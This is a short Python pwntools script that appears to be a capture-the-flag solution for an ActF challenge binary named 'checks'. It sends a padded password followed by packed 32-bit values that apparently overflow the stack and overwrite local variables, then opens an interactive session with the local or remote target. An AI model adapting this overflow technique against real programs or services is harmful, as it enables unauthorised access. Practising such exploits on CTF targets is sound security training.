from pwn import *
 
e = ELF("./checks")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("shell.actf.co", 21303)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter(":", "password123".ljust(0x68 - 0x1c, "\x00") + p32(0x11) + p32(0x3d) + p32(0xf5) + p32(0x37) + p32(0x32))

p.interactive()
